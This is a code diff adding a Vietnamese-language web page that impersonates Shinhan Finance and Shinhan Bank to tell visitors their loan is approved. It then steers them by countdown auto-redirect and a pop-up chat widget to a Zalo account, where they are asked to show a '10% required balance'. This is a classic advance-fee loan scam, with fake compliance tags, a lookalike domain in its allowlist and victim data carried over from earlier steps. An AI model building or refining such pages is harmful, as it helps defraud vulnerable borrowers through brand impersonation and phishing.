@@ -1,0 +1,1053 @@
+<!DOCTYPE html>
+<html lang="vi">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Phê Duyệt Khoản Vay - Shinhan Finance</title>
+
+    <!-- SEO & Security -->
+    <meta http-equiv="X-Content-Type-Options" content="nosniff" />
+    <meta name="description" content="Khoản vay đã được phê duyệt. Liên hệ ngay để hoàn tất giải ngân." />
+    <meta name="keywords" content="phê duyệt vay, Shinhan Bank, giải ngân, Zalo" />
+    <meta name="robots" content="noindex, nofollow" />
+    <meta name="theme-color" content="#00468F" />
+    
+    <!-- Security Headers for Banking -->
+    <meta http-equiv="X-XSS-Protection" content="1; mode=block" />
+    <meta http-equiv="Referrer-Policy" content="strict-origin-when-cross-origin" />
+    <meta http-equiv="Permissions-Policy" content="camera=(), microphone=(), geolocation=()" />
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://code.jquery.com https://cdn.jsdelivr.net https://cdnjs.cloudflare.com https://sp.zalo.me 'unsafe-inline'; style-src 'self' https://cdn.jsdelivr.net https://fonts.googleapis.com https://cdnjs.cloudflare.com 'unsafe-inline'; font-src 'self' https://fonts.gstatic.com https://cdnjs.cloudflare.com; img-src 'self' https://shinhan.com.vn https://via.placeholder.com data: file:; connect-src 'self' https://cdn.jsdelivr.net https://sp.zalo.me; frame-ancestors 'none'; frame-src https://page.widget.zalo.me https://sp.zalo.me; object-src 'none';" />
+
+    <!-- Banking Compliance -->
+    <meta name="banking-compliance" content="PCI-DSS, SOX, GDPR" />
+    <meta name="data-protection" content="encrypted-storage, secure-transmission" />
+
+    <!-- Essential Resources Only -->
+
+  <!-- Fonts & Icons -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+    <link rel="icon" href="https://shinhan.com.vn/favicon.ico" />
+
+    <style>
+      :root {
+        --primary: #00468F;
+        --primary-dark: #003a78;
+        --accent: #2BB673;
+        --warning: #FFB703;
+        --success: #10B981;
+        --danger: #EF4444;
+        --bg: #F7FAFC;
+        --bg-gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        --card-bg: #FFFFFF;
+        --text: #1F2937;
+        --text-light: #6B7280;
+        --text-muted: #9CA3AF;
+        --white: #FFFFFF;
+        --border: #E5E7EB;
+        --shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+        --shadow-lg: 0 20px 25px -5px rgba(0, 0, 0, 0.1);
+        --border-radius: 12px;
+        --border-radius-lg: 16px;
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    
+    body {
+      font-family: 'Inter', sans-serif;
+      background: var(--bg-gradient);
+      color: var(--text);
+      line-height: 1.6;
+        min-height: 100vh;
+      }
+
+    /* Header */
+    .header {
+        background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+        color: var(--white);
+        padding: 3rem 1rem;
+        text-align: center;
+        box-shadow: var(--shadow-lg);
+        position: relative;
+        overflow: hidden;
+      }
+    
+    .header::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><defs><pattern id="grain" width="100" height="100" patternUnits="userSpaceOnUse"><circle cx="25" cy="25" r="1" fill="rgba(255,255,255,0.1)"/><circle cx="75" cy="75" r="1" fill="rgba(255,255,255,0.1)"/><circle cx="50" cy="10" r="0.5" fill="rgba(255,255,255,0.05)"/><circle cx="10" cy="60" r="0.5" fill="rgba(255,255,255,0.05)"/><circle cx="90" cy="40" r="0.5" fill="rgba(255,255,255,0.05)"/></pattern></defs><rect width="100" height="100" fill="url(%23grain)"/></svg>');
+        opacity: 0.3;
+      }
+
+      .header-content {
+        position: relative;
+        z-index: 1;
+    }
+
+    .logo {
+      width: 180px;
+      height: auto;
+      margin-bottom: 1.5rem;
+      filter: brightness(0) invert(1);
+    }
+
+    .success-icon {
+      width: 100px;
+      height: 100px;
+      background: linear-gradient(135deg, var(--success) 0%, var(--accent) 100%);
+        border-radius: 50%;
+      display: inline-flex;
+        align-items: center;
+        justify-content: center;
+      margin-bottom: 1.5rem;
+      animation: successPulse 2s infinite;
+      box-shadow: 0 8px 32px rgba(16, 185, 129, 0.3);
+      position: relative;
+    }
+    
+    .success-icon::before {
+      content: '';
+      position: absolute;
+      top: -5px;
+      left: -5px;
+      right: -5px;
+      bottom: -5px;
+      background: linear-gradient(135deg, var(--success) 0%, var(--accent) 100%);
+        border-radius: 50%;
+      opacity: 0.3;
+      animation: ripple 2s infinite;
+    }
+    
+    .success-icon i {
+      font-size: 2.5rem;
+      color: white;
+      z-index: 1;
+      position: relative;
+    }
+    
+    .approval-badge {
+      display: inline-flex;
+        align-items: center;
+      gap: 0.5rem;
+      background: rgba(255, 255, 255, 0.2);
+      padding: 0.75rem 1.5rem;
+      border-radius: 50px;
+      border: 1px solid rgba(255, 255, 255, 0.3);
+      margin-top: 1rem;
+      animation: slideInLeft 0.8s ease-out 0.3s both;
+    }
+    
+    .approval-badge i {
+      color: var(--success);
+      font-size: 1.2rem;
+    }
+    
+    .approval-badge span {
+        font-weight: 600;
+      font-size: 0.9rem;
+    }
+      
+    @keyframes successPulse {
+        0%, 100% { 
+          transform: scale(1);
+          box-shadow: 0 8px 32px rgba(16, 185, 129, 0.3);
+        }
+        50% { 
+          transform: scale(1.05);
+          box-shadow: 0 12px 40px rgba(16, 185, 129, 0.5);
+        }
+      }
+      
+      @keyframes ripple {
+        0% {
+          transform: scale(1);
+          opacity: 0.3;
+        }
+        100% {
+          transform: scale(1.4);
+          opacity: 0;
+        }
+      }
+      
+      @keyframes fadeInUp {
+        from {
+          opacity: 0;
+          transform: translateY(30px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+      
+      @keyframes slideInLeft {
+        from {
+          opacity: 0;
+          transform: translateX(-30px);
+        }
+        to {
+          opacity: 1;
+          transform: translateX(0);
+        }
+      }
+
+    .success-icon i {
+        font-size: 36px;
+        color: var(--white);
+      }
+
+    h1 {
+      font-size: 1.75rem;
+      margin-bottom: 0.5rem;
+    }
+
+    .amount {
+      font-size: 1.5rem;
+        font-weight: 700;
+        color: #d1fae5;
+      margin: 1rem 0;
+    }
+
+    /* Main Content */
+    .container {
+      max-width: 900px;
+      margin: -3rem auto 2rem;
+      padding: 0 1rem;
+      animation: fadeInUp 0.8s ease-out;
+    }
+
+    .card {
+      background: var(--card-bg);
+      border-radius: var(--border-radius-lg);
+      padding: 2.5rem;
+      box-shadow: var(--shadow-lg);
+      margin-bottom: 2rem;
+      border: 1px solid var(--border);
+        position: relative;
+        overflow: hidden;
+      transition: all 0.3s ease;
+      }
+    
+    .card::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        height: 4px;
+      background: linear-gradient(90deg, var(--primary) 0%, var(--accent) 100%);
+    }
+    
+    .card:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.15);
+    }
+
+    .card-header {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+      margin-bottom: 1.5rem;
+      padding-bottom: 1rem;
+      border-bottom: 2px solid var(--border);
+    }
+
+    .card-header h2 {
+      font-size: 1.25rem;
+      color: var(--primary);
+        font-weight: 600;
+    }
+
+    .card-header i {
+      font-size: 1.5rem;
+      color: var(--primary);
+    }
+
+
+    /* CTA Button */
+    .cta-section {
+      text-align: center;
+      margin: 2rem 0;
+    }
+
+      .btn-primary { 
+        display: inline-flex;
+        align-items: center;
+      gap: 12px;
+        background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%); 
+        color: var(--white);
+      padding: 1rem 2.5rem;
+      border-radius: 50px;
+      font-size: 1.1rem;
+      font-weight: 600;
+      border: none;
+      cursor: pointer;
+      text-decoration: none;
+        transition: all 0.3s ease;
+      box-shadow: 0 4px 15px rgba(0,70,143,0.3);
+        position: relative;
+        overflow: hidden;
+      }
+
+      .btn-primary::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: -100%;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+        transition: left 0.5s;
+      }
+
+      .btn-primary:hover::before {
+        left: 100%;
+      }
+
+      .btn-primary:hover { 
+        transform: translateY(-2px);
+      box-shadow: 0 6px 20px rgba(0,70,143,0.4);
+    }
+
+    .countdown {
+      margin-top: 1rem;
+      color: var(--text-light);
+      font-size: 0.9rem;
+    }
+
+    .countdown strong {
+      color: var(--primary);
+      font-size: 1.1rem;
+    }
+
+
+    /* Footer */
+    .footer {
+      background: #0a2540;
+        color: var(--white);
+      padding: 2rem 1rem;
+        text-align: center;
+      margin-top: 3rem;
+    }
+
+    .footer a {
+      color: #93c5fd;
+      text-decoration: none;
+      margin: 0 0.5rem;
+    }
+
+    .footer a:hover {
+        color: var(--white);
+    }
+
+    /* Responsive */
+    @media (max-width: 640px) {
+      .header {
+        padding: 2rem 1rem;
+      }
+      
+      .header img {
+        width: 150px;
+        height: auto;
+      }
+      
+      .success-icon {
+        width: 80px;
+        height: 80px;
+      }
+      
+      .success-icon i {
+        font-size: 2rem;
+      }
+      
+      h1 { 
+        font-size: 1.5rem; 
+        margin-bottom: 0.5rem;
+      }
+      
+      .amount { 
+        font-size: 1.25rem; 
+        margin: 0.5rem 0;
+      }
+      
+      .approval-badge {
+        padding: 0.5rem 1rem;
+        font-size: 0.8rem;
+      }
+      
+      .container {
+        max-width: 95%;
+        margin: -2rem auto 1rem;
+        padding: 0 0.5rem;
+      }
+      
+      .card { 
+        padding: 1.5rem; 
+        margin-bottom: 1rem;
+      }
+      
+      .card-header {
+        margin-bottom: 1rem;
+        padding-bottom: 0.75rem;
+      }
+      
+      .card-header h2 {
+        font-size: 1.1rem;
+      }
+      
+      .info-item {
+        padding: 0.75rem;
+        margin-bottom: 0.5rem;
+      }
+      
+      .info-item .label {
+        font-size: 0.9rem;
+      }
+      
+      .info-item .value {
+        font-size: 1rem;
+      }
+      
+      .btn-primary {
+        padding: 0.875rem 2rem;
+        font-size: 1rem;
+        width: 100%;
+        margin-bottom: 1rem;
+      }
+      
+      .countdown {
+        font-size: 0.8rem;
+        margin-top: 0.5rem;
+      }
+      
+      .simple-faq p {
+        font-size: 0.9rem;
+        padding: 0.75rem;
+        margin: 0.75rem 0;
+      }
+      
+      .footer {
+        padding: 1.5rem 1rem;
+        font-size: 0.8rem;
+      }
+      
+      .footer-links a {
+        font-size: 0.8rem;
+        margin: 0 0.25rem;
+      }
+    }
+
+    /* Loan Info */
+    .loan-info {
+      margin: 1.5rem 0;
+    }
+    
+    .info-item {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      padding: 1rem;
+      background: #f9fafb;
+      border-radius: 8px;
+      margin-bottom: 0.75rem;
+        border: 1px solid var(--border);
+      opacity: 0;
+      transform: translateX(-10px);
+      transition: all 0.3s ease;
+    }
+    
+    .info-item .label {
+      font-weight: 500;
+      color: var(--text);
+    }
+    
+    .info-item .value {
+        font-weight: 700;
+      color: var(--primary);
+      font-size: 1.1rem;
+    }
+    
+    .status-approved {
+      color: var(--success);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    
+    .status-approved i {
+      font-size: 1.2rem;
+    }
+    
+    /* Simple FAQ */
+    .simple-faq p {
+      margin: 1rem 0;
+          padding: 1rem;
+      background: #f0f9ff;
+      border-left: 4px solid #0ea5e9;
+        border-radius: 8px;
+      color: #075985;
+    }
+    
+    .simple-faq i {
+      margin-right: 0.5rem;
+      color: #0ea5e9;
+    }
+    
+    /* Enhanced Professional Styles */
+    .btn-primary {
+      background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+      border: none;
+      border-radius: var(--border-radius);
+      padding: 1.25rem 3rem;
+      color: white;
+      font-weight: 600;
+      font-size: 1.1rem;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      transition: all 0.3s ease;
+      box-shadow: 0 8px 25px rgba(0, 70, 143, 0.3);
+        position: relative;
+        overflow: hidden;
+      }
+    
+    .btn-primary::before {
+      content: '';
+        position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+      transition: left 0.5s;
+    }
+    
+    .btn-primary:hover::before {
+      left: 100%;
+    }
+    
+    .btn-primary:hover {
+      background: linear-gradient(135deg, var(--primary-dark) 0%, var(--primary) 100%);
+      transform: translateY(-3px);
+      box-shadow: 0 12px 35px rgba(0, 70, 143, 0.5);
+    }
+
+    /* Progress Bar */
+    .progress {
+      height: 8px;
+      background-color: rgba(255, 255, 255, 0.2);
+      border-radius: 4px;
+      overflow: hidden;
+      margin-bottom: 2rem;
+    }
+    
+    .progress-bar {
+      height: 100%;
+      background: linear-gradient(90deg, var(--success) 0%, var(--accent) 100%);
+      border-radius: 4px;
+      transition: width 0.6s ease;
+      position: relative;
+    }
+    
+    .progress-text {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      color: white;
+      font-size: 0.75rem;
+      font-weight: 600;
+      text-shadow: 0 1px 2px rgba(0,0,0,0.3);
+    }
+    
+    /* Accessibility */
+    .visually-hidden {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      margin: -1px;
+      overflow: hidden;
+      clip: rect(0,0,0,0);
+      border: 0;
+    }
+    
+    .focus-visible {
+      outline: 2px solid var(--primary);
+      outline-offset: 2px;
+    }
+    
+    /* Error Handling */
+    .error-inline {
+      color: var(--danger);
+          font-size: 0.875rem;
+      display: none;
+      margin-top: 0.25rem;
+      padding: 0.5rem;
+      background: rgba(239, 68, 68, 0.1);
+      border-radius: 4px;
+      border-left: 3px solid var(--danger);
+    }
+    
+    .error-inline i {
+      margin-right: 0.25rem;
+    }
+    
+    .has-error {
+      border-color: var(--danger) !important;
+      box-shadow: 0 0 0 2px rgba(239, 68, 68, 0.2) !important;
+    }
+    
+    /* Loading States */
+    .loading-spinner {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 2px solid rgba(255,255,255,0.3);
+      border-radius: 50%;
+      border-top-color: white;
+      animation: spin 1s ease-in-out infinite;
+    }
+    
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    
+    /* Utility */
+    .text-center { text-align: center; }
+    .mt-1 { margin-top: 0.5rem; }
+    .mt-2 { margin-top: 1rem; }
+    .mb-2 { margin-bottom: 1rem; }
+      </style>
+  </head>
+
+<body>
+  <!-- Header -->
+  <header class="header">
+    <div class="header-content">
+          <img
+            src="https://cdn.haitrieu.com/wp-content/uploads/2023/11/Logo-Shinhan-Bank.png"
+        alt="Shinhan Finance" 
+        class="logo"
+            onerror="this.src='https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg'"
+          />
+
+      <div class="success-icon" role="img" aria-label="Thành công">
+              <i class="fas fa-check" aria-hidden="true"></i>
+          </div>
+
+            <h1>🎉 Khoản vay đã được phê duyệt</h1>
+      <div class="amount" id="loanAmount" aria-live="polite" aria-label="Số tiền vay">Đang tải...</div>
+      
+      <div class="approval-badge" role="status" aria-label="Trạng thái phê duyệt">
+        <i class="fas fa-certificate" aria-hidden="true"></i>
+        <span>Đã phê duyệt</span>
+          </div>
+        </div>
+      </header>
+
+      <!-- Main Content -->
+  <main class="container">
+    <!-- Progress Bar -->
+    <div class="progress mb-4" role="progressbar" aria-label="Tiến độ hoàn thành" aria-valuenow="100" aria-valuemin="0" aria-valuemax="100">
+      <div class="progress-bar bg-success" style="width: 100%;" aria-valuenow="100">
+        <span class="progress-text">100% Hoàn thành</span>
+          </div>
+        </div>
+
+    <!-- Loan Info Card -->
+    <div class="card">
+      <div class="card-header">
+        <i class="fas fa-money-bill-wave"></i>
+        <h2>Thông tin khoản vay</h2>
+          </div>
+
+      <div class="loan-info">
+        <div class="info-item">
+          <span class="label">Số tiền vay:</span>
+          <span class="value" id="loanAmountDisplay">Đang tải...</span>
+          </div>
+        <div class="info-item">
+          <span class="label">Số dư yêu cầu (10%):</span>
+          <span class="value" id="requiredAmount">...</span>
+              </div>
+                </div>
+
+      <!-- Simple CTA -->
+      <div class="cta-section">
+            <a
+              href="https://zalo.me/3932037504673339016"
+              target="_blank"
+              rel="noopener noreferrer"
+          class="btn-primary"
+          id="zaloBtn"
+          role="button"
+          aria-label="Liên hệ Zalo để giải ngân khoản vay"
+          tabindex="0"
+            >
+              <i class="fab fa-telegram-plane" aria-hidden="true"></i>
+          <span>Liên hệ Zalo để giải ngân</span>
+              <i class="fas fa-arrow-right" aria-hidden="true"></i>
+          <span class="loading-spinner" style="display: none;" aria-hidden="true"></span>
+        </a>
+        
+        <div class="countdown" role="status" aria-live="polite" aria-atomic="true">
+        <i class="fas fa-clock" aria-hidden="true"></i>
+        Tự động chuyển hướng sau <strong id="countdown" aria-label="Đếm ngược">8</strong> giây
+        <button id="pauseCountdown" class="btn btn-sm btn-secondary ml-2" aria-label="Tạm dừng đếm ngược">Tạm dừng</button>
+      </div>
+            </div>
+          </div>
+
+    <!-- Simple FAQ -->
+    <div class="card">
+      <div class="card-header">
+        <i class="fas fa-question-circle"></i>
+        <h2>Câu hỏi thường gặp</h2>
+          </div>
+      
+      <div class="simple-faq">
+        <p><i class="fas fa-info-circle"></i> <strong>Hướng dẫn:</strong> Nhấn nút "Liên hệ Zalo để giải ngân" → Gửi ảnh số dư tài khoản → Nhận tiền trong 1-2 giờ làm việc</p>
+        <p><i class="fas fa-shield-check"></i> <strong>Miễn phí hoàn toàn</strong> - Không cần chuyển tiền trước</p>
+          </div>
+          </div>
+  </main>
+
+      <!-- Footer -->
+  <footer class="footer">
+    <div>
+      <a href="tel:19005555888"><i class="fas fa-phone"></i> Hotline: 1900 5555 888</a> |
+      <a href="mailto:support@shinhan.com.vn"><i class="fas fa-envelope"></i> support@shinhan.com.vn</a>
+            </div>
+    <p class="mt-2">© 2025 SHINHAN BANK VIETNAM. ALL RIGHTS RESERVED.</p>
+      </footer>
+
+  <!-- Scripts -->
+  <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
+    <script>
+    (function() {
+      'use strict';
+      
+      // DOM helper that works with selector strings or elements and provides utility methods
+      const $ = (selOrEl) => {
+        const el = typeof selOrEl === 'string' 
+          ? document.querySelector(selOrEl) 
+          : (selOrEl && selOrEl.el) ? selOrEl.el : selOrEl;
+        if (!el) return null;
+        return {
+          el,
+          text(value) { if (typeof value !== 'undefined') { this.el.textContent = String(value); return this; } return this.el.textContent; },
+          html(value) { if (typeof value !== 'undefined') { this.el.innerHTML = value; return this; } return this.el.innerHTML; },
+          show(display) { this.el.style.display = display || (this.el.tagName === 'SPAN' ? 'inline' : 'block'); return this; },
+          hide() { this.el.style.display = 'none'; return this; },
+          on(evt, handler) { this.el.addEventListener(evt, handler); return this; },
+          addClass(c) { this.el.classList.add(c); return this; },
+          removeClass(c) { this.el.classList.remove(c); return this; }
+        };
+      };
+      const $$ = (sel) => document.querySelectorAll(sel);
+      
+      // Sanitize input to prevent XSS
+      function sanitizeInput(input) {
+        if (typeof input !== 'string') return '';
+        const div = document.createElement('div');
+        div.textContent = input; // Escape HTML entities
+        return div.textContent; // Return textContent instead of innerHTML
+      }
+      
+      // Validate and sanitize user data
+      function validateUserData(data) {
+        const sanitized = {};
+        for (const key in data) {
+          if (typeof data[key] === 'string') {
+            sanitized[key] = sanitizeInput(data[key]);
+          } else {
+            sanitized[key] = data[key];
+          }
+        }
+        return sanitized;
+      }
+      
+      // Format currency
+      const formatCurrency = (val, suffix = 'VND') => {
+        try {
+          const num = parseFloat(val);
+          if (isNaN(num) || num < 0) {
+            return '0 VND';
+          }
+          return `${num.toLocaleString('en-US')} ${suffix}`;
+        } catch (error) {
+          // Error formatting currency
+          return '0 VND';
+        }
+      };
+      
+      // Performance monitoring
+      const performanceStart = performance.now();
+      
+      // Simple audit logging
+      function auditLog(action, data = {}) {
+        try {
+          // Action logged
+        } catch (error) {
+          // Logging error
+        }
+      }
+      
+      // Analytics tracking
+      function trackEvent(eventName, data = {}) {
+        try {
+          // Event tracked
+          // Add analytics tracking here if needed
+        } catch (error) {
+          // Analytics error
+        }
+      }
+      
+      // Load user data
+      function loadData() {
+          try {
+            const raw = localStorage.getItem('userData');
+          
+          // Nếu không có dữ liệu, chuyển về trang đăng ký
+          if (!raw) {
+            // No userData found, redirecting to registration
+            // Sử dụng document.getElementById thay vì jQuery để tránh lỗi
+            if (document.getElementById('loanAmount')) {
+              document.getElementById('loanAmount').innerHTML = 'Lỗi tải dữ liệu';
+            }
+            setTimeout(() => {
+              window.location.href = 'step7.html';
+            }, 2000);
+            return;
+          }
+          
+          // Parse data (with decryption support)
+            let data;
+            try {
+              const bytes = CryptoJS.AES.decrypt(raw, 'shinhan-secret-key');
+            const decrypted = bytes.toString(CryptoJS.enc.Utf8);
+            data = decrypted ? JSON.parse(decrypted) : JSON.parse(raw);
+          } catch {
+                data = JSON.parse(raw);
+              }
+              
+          // Sanitize user data to prevent XSS
+          data = validateUserData(data);
+          
+          // Validate essential data
+          if (!data.loanAmount || !data.fullName) {
+            // Invalid userData, redirecting
+            const loanAmountEl = document.getElementById('loanAmount');
+            if (loanAmountEl) loanAmountEl.textContent = 'Dữ liệu không hợp lệ';
+            const loanAmountDisplayEl = document.getElementById('loanAmountDisplay');
+            if (loanAmountDisplayEl) loanAmountDisplayEl.textContent = 'Dữ liệu không hợp lệ';
+            const requiredAmountEl = document.getElementById('requiredAmount');
+            if (requiredAmountEl) requiredAmountEl.textContent = 'N/A';
+            setTimeout(() => {
+              window.location.href = 'step7.html';
+            }, 3000);
+            return;
+          }
+          
+          // Update UI with actual data
+          const loan = parseFloat(data.loanAmount);
+          if (!isNaN(loan)) {
+            const loanAmountEl2 = document.getElementById('loanAmount');
+            if (loanAmountEl2) loanAmountEl2.textContent = formatCurrency(loan);
+            const loanAmountDisplayEl2 = document.getElementById('loanAmountDisplay');
+            if (loanAmountDisplayEl2) loanAmountDisplayEl2.textContent = formatCurrency(loan);
+            
+            const required = loan * 0.1;
+            const requiredAmountEl2 = document.getElementById('requiredAmount');
+            if (requiredAmountEl2) requiredAmountEl2.textContent = formatCurrency(required, 'đ');
+            
+            // Track successful data load
+            trackEvent('data_loaded_successfully', {
+              loanAmount: loan,
+              requiredAmount: required,
+              loadTime: performance.now() - performanceStart
+            });
+            
+            // Audit log for compliance
+            auditLog('loan_approval_viewed', {
+              loanAmount: loan,
+              requiredAmount: required,
+              loadTime: performance.now() - performanceStart
+            });
+          } else {
+            const loanAmountElErr = document.getElementById('loanAmount');
+            if (loanAmountElErr) loanAmountElErr.textContent = 'Lỗi dữ liệu';
+            const loanAmountDisplayElErr = document.getElementById('loanAmountDisplay');
+            if (loanAmountDisplayElErr) loanAmountDisplayElErr.textContent = 'Lỗi dữ liệu';
+            const requiredAmountElErr = document.getElementById('requiredAmount');
+            if (requiredAmountElErr) requiredAmountElErr.textContent = 'N/A';
+            
+            // Track data error
+            trackEvent('data_load_error', {
+              error: 'Invalid loan amount',
+              loadTime: performance.now() - performanceStart
+            });
+          }
+          
+        } catch (err) {
+          // Error loading data
+          // Sử dụng document.getElementById thay vì jQuery để tránh lỗi
+          if (document.getElementById('loanAmount')) {
+            document.getElementById('loanAmount').innerHTML = 'Lỗi tải dữ liệu';
+          }
+          if (document.getElementById('loanAmountDisplay')) {
+            document.getElementById('loanAmountDisplay').innerHTML = 'Lỗi tải dữ liệu';
+          }
+          if (document.getElementById('requiredAmount')) {
+            document.getElementById('requiredAmount').innerHTML = 'N/A';
+          }
+          
+          // Redirect về trang đăng ký sau 3 giây
+          setTimeout(() => {
+            window.location.href = 'step7.html';
+          }, 3000);
+        }
+      }
+      
+      
+      // Validate external URLs trước redirect để chống phishing
+      function validateExternalUrl(url) {
+        // Danh sách các domain được phép
+        const allowedDomains = [
+          'zalo.me',
+          'chatbot.zalo.me',
+          'shinhan.com.vn',
+          'shinhanfinance.com.vn',
+          'vaytieudung-shinhanfinancer.com'
+        ];
+        
+        try {
+          const urlObj = new URL(url);
+          const domain = urlObj.hostname;
+          
+          // Kiểm tra xem domain có trong danh sách được phép không
+          const isAllowed = allowedDomains.some(allowedDomain => 
+            domain === allowedDomain || domain.endsWith('.' + allowedDomain)
+          );
+          
+          if (!isAllowed) {
+            console.error('Phát hiện URL không an toàn:', url);
+            // Ghi log sự cố bảo mật
+            auditLog('security_warning', {
+              type: 'unsafe_redirect',
+              url: url,
+              timestamp: new Date().toISOString(),
+              userAgent: navigator.userAgent
+            });
+            return false;
+          }
+          
+          return true;
+        } catch (e) {
+          console.error('URL không hợp lệ:', url, e);
+          return false;
+        }
+      }
+      
+      // Auto-redirect countdown
+      function initCountdown() {
+        const countdownEl = document.getElementById('countdown');
+        const zaloBtn = document.getElementById('zaloBtn');
+        const pauseBtn = document.getElementById('pauseCountdown');
+        const zaloUrl = 'https://zalo.me/3932037504673339016';
+        
+        if (!countdownEl || !zaloBtn) {
+          // Countdown elements not found
+          return;
+        }
+        
+        let sec = 8;
+        let paused = false;
+        let timer;
+        
+        function renderCount() {
+          countdownEl.textContent = String(sec);
+        }
+        
+        function startTimer() {
+          timer = setInterval(() => {
+            if (!paused) {
+              renderCount();
+              if (sec-- <= 0) {
+                clearInterval(timer);
+                // Validate URL trước khi redirect
+                if (validateExternalUrl(zaloUrl)) {
+                  // Redirect to Zalo
+                  window.location.href = zaloUrl;
+                } else {
+                  // Hiển thị thông báo lỗi nếu URL không an toàn
+                  alert('Không thể chuyển hướng đến URL không an toàn. Vui lòng liên hệ hỗ trợ.');
+                }
+              }
+            }
+          }, 1000);
+        }
+        
+        startTimer();
+        
+        // Thêm chức năng pause/resume cho countdown
+        if (pauseBtn) {
+          pauseBtn.addEventListener('click', function() {
+            paused = !paused;
+            this.textContent = paused ? 'Tiếp tục' : 'Tạm dừng';
+          });
+        }
+        
+        if (zaloBtn) {
+          zaloBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            
+            // Show loading state
+            const spinner = zaloBtn.querySelector('.loading-spinner');
+            const text = zaloBtn.querySelector('span');
+            if (spinner && text) {
+              spinner.style.display = 'inline-block';
+              text.textContent = 'Đang chuyển hướng...';
+            }
+            
+            clearInterval(timer);
+            trackEvent('zalo_button_clicked', {
+              timeRemaining: sec,
+              loadTime: performance.now() - performanceStart
+            });
+            
+            // Audit log for Zalo contact
+            auditLog('zalo_contact_initiated', {
+              timeRemaining: sec,
+              loadTime: performance.now() - performanceStart
+            });
+            
+            // Delay redirect to show loading state
+            setTimeout(() => {
+              window.location.href = zaloUrl;
+            }, 500);
+          });
+        }
+      }
+      
+      // Init
+        document.addEventListener('DOMContentLoaded', () => {
+        loadData();
+        initCountdown();
+      });
+      })();
+    </script>
+
+  <!-- Zalo Widget -->
+  <div 
+    class="zalo-chat-widget" 
+    data-oaid="3932037504673339016"
+    data-welcome-message="Chào anh chị, mình cần hỗ trợ thẩm định giải ngân!"
+    data-autopopup="5"
+  ></div>
+  <script src="https://sp.zalo.me/plugins/sdk.js"></script>
+  </body>
+</html>
